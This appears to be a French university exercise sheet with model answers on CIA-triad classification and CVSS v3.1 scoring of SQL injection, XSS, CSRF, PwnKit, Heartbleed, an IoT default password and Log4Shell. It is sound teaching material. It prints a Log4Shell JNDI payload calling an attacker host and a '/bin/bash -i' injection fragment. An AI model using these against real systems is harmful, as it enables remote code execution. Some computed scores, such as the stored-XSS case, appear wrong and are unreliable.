---
title: "Exercices -- Qualification de vulnerabilites et CVSS"
sidebar_position: 2
---

# Exercices -- Qualification de vulnerabilites et CVSS

> Following teacher instructions from: S6/Vulnerabilites/data/moodle/guide/01_intro_securite.md
> Sources du cours : 2026-Vulnerabilities.pdf, C1-annotated.pdf

---

## Exercice 1 : Qualifier des vulnerabilites (triade CIA)

### Pour chaque scenario, identifiez la ou les proprietes CIA violees

**Answer:**

| Scenario | C | I | A | Justification |
|----------|---|---|---|---------------|
| Un attaquant lit les emails confidentiels d'un employe | X | | | Lecture non autorisee = violation de Confidentialite |
| Un DDoS rend un site web inaccessible | | | X | Service indisponible = violation de Disponibilite |
| Un attaquant modifie le montant d'un virement bancaire | | X | | Modification non autorisee = violation d'Integrite |
| Un ransomware chiffre tous les fichiers d'un serveur | X | X | X | Exfiltration (C), chiffrement/modification (I), acces bloque (A) |
| Un attaquant installe un keylogger | X | | | Capture des frappes = violation de Confidentialite |
| Defacement d'un site web | | X | | Modification du contenu = violation d'Integrite |
| Interception de trafic HTTPS mal configure | X | | | Lecture du trafic = violation de Confidentialite |
| DROP TABLE via injection SQL | | X | X | Suppression de donnees (I) + service indisponible (A) |
| Vol d'un disque dur non chiffre | X | | X | Lecture des donnees (C) + perte physique du disque (A) |

**Explication detaillee du ransomware (piege classique en DS) :**
- **C** : les ransomwares modernes (double extorsion) exfiltrent les donnees avant de les chiffrer
- **I** : les fichiers sont modifies (chiffres), leur contenu original est altere
- **A** : les fichiers ne sont plus accessibles sans la cle de dechiffrement

**Security explanation:**

La triade CIA est le modele fondamental pour evaluer la securite. Chaque vulnerabilite viole une ou plusieurs proprietes :
- **Confidentialite** : empecher l'acces non autorise a l'information
- **Integrite** : garantir que l'information n'est pas modifiee sans autorisation
- **Disponibilite** : garantir que le systeme reste accessible

---

## Exercice 2 : Metriques CVSS v3.1 -- Methodologie systematique

### Rappel des metriques

| Metrique | Valeurs possibles | Du plus grave au moins grave |
|----------|------------------|------------------------------|
| AV (Attack Vector) | Network, Adjacent, Local, Physical | N > A > L > P |
| AC (Attack Complexity) | Low, High | L > H |
| PR (Privileges Required) | None, Low, High | N > L > H |
| UI (User Interaction) | None, Required | N > R |
| S (Scope) | Changed, Unchanged | C > U |
| C (Confidentiality) | High, Low, None | H > L > N |
| I (Integrity) | High, Low, None | H > L > N |
| A (Availability) | High, Low, None | H > L > N |

### Methode pour le DS : poser la question cle pour chaque metrique

**Answer:**

```
AV : D'ou l'attaquant lance-t-il l'attaque ?
     Internet/reseau --> N    LAN/WiFi --> A    Acces local --> L    Acces physique --> P

AC : L'attaque necessite-t-elle des conditions particulieres ?
     Non, toujours reproductible --> L    Oui, timing/config/race condition --> H

PR : L'attaquant a-t-il besoin d'un compte ?
     Non --> N    Compte normal --> L    Compte admin --> H

UI : La victime doit-elle faire quelque chose ?
     Non --> N    Cliquer sur un lien, ouvrir un fichier --> R

S  : L'attaque affecte-t-elle un composant different ?
     Non, meme composant --> U    Oui, autre composant (ex: VM --> hyperviseur) --> C

C  : Quel est l'impact sur la confidentialite ?
     Acces total aux donnees --> H    Acces partiel --> L    Aucun --> N

I  : Quel est l'impact sur l'integrite ?
     Modification complete --> H    Modification partielle --> L    Aucun --> N

A  : Quel est l'impact sur la disponibilite ?
     Service completement down --> H    Performance degradee --> L    Aucun --> N
```

---

## Exercice 3 : Cas pratiques CVSS

### Cas A : Injection SQL via formulaire web (lecture seule)

**Contexte :** un formulaire de recherche sur un site web est vulnerable a l'injection SQL. L'attaquant peut extraire toute la base de donnees mais ne peut pas modifier les donnees.

**Answer:**

```
AV:N  -- formulaire web accessible via internet
        Question : peut-on lancer l'attaque a distance ? OUI
AC:L  -- l'injection est reproductible a chaque tentative
        Question : y a-t-il des conditions complexes ? NON
PR:N  -- le formulaire est public, pas besoin de compte
        Question : faut-il etre authentifie ? NON
UI:N  -- l'attaquant agit seul
        Question : la victime doit-elle interagir ? NON
S:U   -- seule la base de donnees est affectee (meme composant)
C:H   -- extraction complete de la base (utilisateurs, mots de passe)
        Question : quel volume de donnees est accessible ? TOUT
I:N   -- lecture seule, pas de modification
A:N   -- le service reste disponible pendant l'attaque

Vecteur : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score : 7.5 (HIGH)
```

### Cas B : Injection SQL avec stacking (lecture + ecriture)

**Answer:**

Si l'attaquant peut aussi executer INSERT/UPDATE/DELETE/DROP :

```
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score : 9.8 (CRITICAL)

Difference avec le cas A :
I:H -- l'attaquant peut modifier/supprimer des donnees (UPDATE, DELETE)
A:H -- l'attaquant peut detruire la base (DROP TABLE)
```

### Cas C : XSS reflete

**Answer:**

```
AV:N  -- attaque via un lien envoye par email/messagerie
AC:L  -- injection simple, reproductible
PR:N  -- pas besoin de compte
UI:R  -- la victime DOIT cliquer sur le lien malicieux
S:C   -- le navigateur de la victime est affecte (composant different du serveur web)
C:L   -- vol de cookie = acces a une session (pas a toute la base)
I:L   -- modification de la page pour cette victime uniquement
A:N   -- pas d'impact sur la disponibilite

Vecteur : AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Score : 6.1 (MEDIUM)
```

**Note :** UI:R reduit significativement le score. C'est la raison principale pour laquelle les XSS reflete ont un score inferieur a l'injection SQL.

### Cas D : XSS stocke ciblant les administrateurs

**Answer:**

```
AV:N  -- forum accessible via internet
AC:L  -- injection simple dans un commentaire
PR:L  -- un compte utilisateur pour poster
UI:N  -- l'admin visite la page naturellement (pas de piege necessaire)
S:C   -- le navigateur de l'admin est affecte
C:H   -- vol du cookie admin = acces administrateur complet
I:H   -- l'attaquant peut modifier le site via le compte admin
A:N   -- pas d'impact direct sur la disponibilite

Vecteur : AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
Score : 9.3 (CRITICAL)
```

### Cas E : PwnKit (CVE-2021-4034)

**Contexte :** elevation de privileges locale via polkit.

**Answer:**

```
AV:L  -- l'attaquant doit avoir un acces local au systeme (shell)
AC:L  -- exploit fiable et reproductible
PR:L  -- un compte utilisateur standard suffit
UI:N  -- pas d'interaction d'un autre utilisateur
S:U   -- reste dans le meme systeme
C:H   -- acces root = lecture de tous les fichiers
I:H   -- root peut tout modifier
A:H   -- root peut supprimer tout le systeme

Vecteur : AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Score : 7.8 (HIGH)
```

**Pourquoi pas CRITICAL ?** AV:L et PR:L reduisent le score. L'attaquant doit deja avoir un acces local au systeme.

### Cas F : CSRF sur changement de mot de passe

**Answer:**

```
AV:N  -- page malicieuse sur internet
AC:L  -- pas de conditions complexes
PR:N  -- l'attaquant n'a pas besoin d'etre authentifie sur le site cible
UI:R  -- la victime doit visiter la page malicieuse
S:U   -- seul le compte de la victime est affecte
C:N   -- pas de lecture de donnees
I:H   -- changement de mot de passe = prise de controle du compte
A:N   -- le service reste disponible

Vecteur : AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
Score : 6.5 (MEDIUM)
```

### Cas G : Injection de commande avec reverse shell

**Answer:**

```
AV:N  -- formulaire web accessible via internet
AC:L  -- injection simple avec "; /bin/bash -i"
PR:N  -- formulaire public
UI:N  -- l'attaquant agit seul
S:C   -- le serveur et l'OS sont affectes (scope change)
C:H   -- acces complet au systeme de fichiers
I:H   -- execution de commandes arbitraires
A:H   -- l'attaquant peut arreter le serveur

Vecteur : AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Score : 10.0 (CRITICAL)
```

**Security explanation:**

Ce score maximum est atteint quand toutes les metriques sont au pire. AV:N + AC:L + PR:N + UI:N = exploitabilite maximale. S:C + C:H + I:H + A:H = impact maximal.

---

## Exercice 4 : Comparer les versions CVSS

### Heartbleed (CVE-2014-0160) :
- CVSS v2 : 5.0
- CVSS v3.1 : 7.5
- CVSS v4 : 8.7

### Q1 : Pourquoi le score augmente entre les versions ?

**Answer:**

```
CVSS v2 : Impact "Partial" sur la confidentialite
  --> En v2, "Partial" couvre un large spectre
  --> Heartbleed permettait de lire des cles privees et des mots de passe
  --> mais "Partial" ne reflete pas la gravite reelle

CVSS v3.1 : Impact C:H sur la confidentialite
  --> Distinction plus fine : H (tout) vs L (partiel) vs N (rien)
  --> Heartbleed donne acces a des donnees tres sensibles --> C:H
  --> Score plus eleve car la confidentialite pese plus lourd

CVSS v4 : Nouvelles metriques
  --> Ajout de AT (Attack Requirements) et distinction VC/SC
  --> Meilleure prise en compte de l'exploitabilite
```

### Q2 : Decomposition du vecteur v3.1

**Answer:**

```
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

AV:N  = vecteur reseau (attaque a distance via HTTPS)
AC:L  = complexite basse (exploitation par un simple paquet TLS)
PR:N  = aucun privilege requis (pas d'authentification)
UI:N  = aucune interaction (l'attaquant agit seul)
S:U   = scope inchange (seul le serveur OpenSSL est affecte)
C:H   = impact HAUTE confidentialite (lecture de memoire : cles privees, tokens)
I:N   = pas de modification possible
A:N   = pas d'impact sur la disponibilite
```

### Q3 : Nouvelles metriques CVSS v4

**Answer:**

| Metrique v4 | Description | Nouveaute |
|------------|------------|-----------|
| AT (Attack Requirements) | Conditions necessaires (config reseau, etc.) | Affine AC |
| VC (Vulnerable System Confidentiality) | Impact C sur le systeme vulnerable | Separation du scope |
| VI (Vulnerable System Integrity) | Impact I sur le systeme vulnerable | Separation du scope |
| VA (Vulnerable System Availability) | Impact A sur le systeme vulnerable | Separation du scope |
| SC (Subsequent System Confidentiality) | Impact C sur d'autres systemes | Remplace S:C |
| SI (Subsequent System Integrity) | Impact I sur d'autres systemes | Remplace S:C |
| SA (Subsequent System Availability) | Impact A sur d'autres systemes | Remplace S:C |

---

## Exercice 5 : Scenario IoT (type DS)

### Une camera de surveillance HikVision est accessible sur le reseau local. Le mot de passe admin est celui par defaut (`admin/12345`).

### Q1 : Proprietes CIA violees

**Answer:**

| Propriete | Violee ? | Justification |
|-----------|---------|---------------|
| C (Confidentialite) | OUI | L'attaquant peut voir le flux video en direct |
| I (Integrite) | OUI | L'attaquant peut modifier les parametres, zones de detection, enregistrements |
| A (Disponibilite) | OUI | L'attaquant peut eteindre la camera, changer le mot de passe, bloquer l'acces |

### Q2 : CVSS selon le contexte

**Answer:**

**Scenario 1 : camera sur LAN uniquement**
```
AV:A  -- accessible uniquement depuis le reseau adjacent (WiFi/LAN)
AC:L  -- mot de passe par defaut = trivial
PR:N  -- le mot de passe est par defaut, donc public
UI:N  -- pas d'interaction necessaire
S:U   -- seule la camera est affectee
C:H   -- acces total au flux video
I:H   -- modification des parametres
A:H   -- possibilite d'eteindre la camera

Vecteur : AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score : 8.8 (HIGH)
```

**Scenario 2 : camera exposee sur internet (port forwarding)**
```
AV:N  -- accessible depuis internet
(tout le reste identique)

Vecteur : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score : 9.8 (CRITICAL)
```

**Note :** un mot de passe par defaut connu publiquement (`admin/12345`) equivaut a PR:N car tout le monde le connait.

### Q3 : Remediation

**Answer:**

| Priorite | Action | Impact CVSS |
|----------|--------|-------------|
| 1 (urgente) | Changer le mot de passe par defaut | PR: N --> H |
| 2 (haute) | Mettre a jour le firmware | Corrige les vulnerabilites connues |
| 3 (haute) | Isoler la camera dans un VLAN separe | AV: N --> A |
| 4 (moyenne) | Desactiver l'acces internet direct / utiliser VPN | AV: N --> L ou P |
| 5 (bonne pratique) | Activer les logs et alertes d'acces | Detection d'intrusion |
| 6 (bonne pratique) | Desactiver UPnP sur le routeur | Empeche l'exposition automatique |

---

## Exercice 6 : Log4Shell (CVE-2021-44228)

### Log4Shell est une vulnerabilite dans la librairie Java Log4j permettant l'execution de code a distance via une chaine JNDI injectee dans un champ logge. Calculez le CVSS.

**Answer:**

```
AV:N  -- l'attaque est lancee via le reseau (requete HTTP avec payload)
        Payload : ${jndi:ldap://attacker.com/exploit}

AC:L  -- l'exploitation est triviale (une seule requete)
        Il suffit que le champ injecte soit logge par Log4j

PR:N  -- aucun privilege necessaire
        N'importe quel visiteur peut injecter dans un champ logge
        (User-Agent, parametres de requete, etc.)

UI:N  -- pas d'interaction necessaire
        Le serveur logge automatiquement les requetes

S:C   -- l'application Java declenche une requete LDAP vers le serveur
        de l'attaquant, qui fournit du code Java execute par le serveur
        --> Scope Change car le systeme affecte (OS) est different
        du composant vulnerable (librairie Log4j)

C:H   -- execution de code = acces complet aux donnees
I:H   -- execution de code = modification complete
A:H   -- execution de code = possibilite d'arreter le service

Vecteur : AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Score : 10.0 (CRITICAL)
```

**Security explanation:**

Log4Shell a le score maximum (10.0) car toutes les metriques sont au pire : exploitabilite maximale (reseau, facile, aucun privilege, aucune interaction) et impact maximal (scope change, acces complet en C/I/A). C'est l'une des vulnerabilites les plus graves de l'histoire.

---

## Exercice 7 : Comparer des vulnerabilites par CVSS

### Classez ces vulnerabilites de la plus grave a la moins grave :

| # | Vulnerabilite | Description |
|---|--------------|-------------|
| A | Injection SQL en lecture | Extraction de la base via formulaire public |
| B | Elevation de privileges locale | User --> root via exploit kernel |
| C | XSS reflete | Vol de cookie via lien malicieux |
| D | CSRF sur suppression de compte | Suppression via page piege |
| E | Mot de passe admin par defaut (IoT) | Camera exposee sur internet |

**Answer:**

| # | Vecteur CVSS | Score | Severite |
|---|-------------|-------|----------|
| E | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | CRITICAL |
| D | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H | 8.1 | HIGH |
| B | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 7.8 | HIGH |
| A | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 | HIGH |
| C | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 6.1 | MEDIUM |

**Classement :** E (9.8) > D (8.1) > B (7.8) > A (7.5) > C (6.1)

**Observations :**
- Le mot de passe par defaut (E) est CRITICAL car exploitable a distance sans aucune interaction
- Le CSRF (D) est plus grave que le XSS (C) car il supprime un compte (I:H + A:H)
- L'elevation de privileges (B) est HIGH malgre C:H/I:H/A:H car AV:L + PR:L
- Le XSS reflete (C) a le score le plus bas car UI:R + impact limite (C:L, I:L)

**Security explanation:**

CVSS est une mesure de **severite**, pas de **risque**. Le risque depend aussi de l'exploitabilite en contexte reel et de la valeur de l'actif. Un XSS reflete (6.1) sur un site bancaire peut representer un risque plus eleve qu'un mot de passe par defaut (9.8) sur une camera non critique.

---

## Resume : echelle CVSS

```
Score        Severite        Exemples typiques
0.0          NONE            Pas de vulnerabilite
0.1 - 3.9    LOW             Information disclosure mineure
4.0 - 6.9    MEDIUM          XSS reflete, CSRF simple
7.0 - 8.9    HIGH            Injection SQL en lecture, elevation de privileges
9.0 - 10.0   CRITICAL        RCE a distance (Log4Shell), injection SQL complete
```

---

## Pieges courants en DS

1. **Scope (S)** : souvent oublie. Changed = l'attaque affecte un composant DIFFERENT du composant vulnerable (ex: XSS = serveur vulnerable mais navigateur affecte)
2. **UI:R vs UI:N** : si la victime doit cliquer/visiter --> UI:R. Sinon --> UI:N. Difference significative sur le score
3. **PR:N avec mot de passe par defaut** : un mot de passe public (admin/admin) --> PR:N car tout le monde le connait
4. **C:H vs C:L** : C:H = acces a TOUTES les donnees sensibles ; C:L = acces partiel ou limite
5. **Ne pas confondre AV:A et AV:L** : Adjacent = meme reseau (WiFi, LAN) ; Local = shell sur la machine
6. **CVSS est une mesure de SEVERITE, pas de RISQUE** : le risque depend aussi de l'exploitabilite en contexte reel et de la valeur de l'actif
7. **Ransomware** : C + I + A (triple impact, piege classique)
